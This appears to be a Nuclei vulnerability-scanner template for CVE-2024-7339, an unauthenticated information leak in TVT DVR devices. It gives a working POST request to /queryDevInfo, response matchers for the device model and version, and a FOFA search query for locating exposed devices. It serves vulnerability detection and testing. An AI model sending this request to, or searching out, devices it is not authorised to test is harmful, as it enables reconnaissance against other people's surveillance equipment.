id: CVE-2024-7339

info:
  name: TVT DVR queryDevInfo Info Leak
  author: Co5mos
  severity: high
  description: |
    TVT DVR设备的queryDevInfo接口存在信息泄漏漏洞，允许未经认证的攻击者通过特定的XML请求获取设备的敏感信息，如内核版本、设备型号等。
  metadata:
    verified: true
    fofa-query: icon_hash="-1492653156"
  tags: tvt, dvr, infoleak, cve, cve2024

http:
  - raw:
      - |
        POST /queryDevInfo HTTP/1.1
        Host: {{Hostname}}

        <?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, '<onvifDevVersion>')
          - contains(body, '<productModel>')
        condition: and
